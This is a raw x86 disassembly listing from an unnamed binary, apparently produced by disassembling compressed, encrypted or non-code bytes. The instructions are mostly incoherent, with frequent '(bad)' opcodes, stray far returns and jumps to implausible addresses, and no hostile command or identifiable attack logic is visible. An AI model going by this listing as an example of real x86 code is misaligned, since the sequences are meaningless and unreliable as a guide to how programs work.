  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
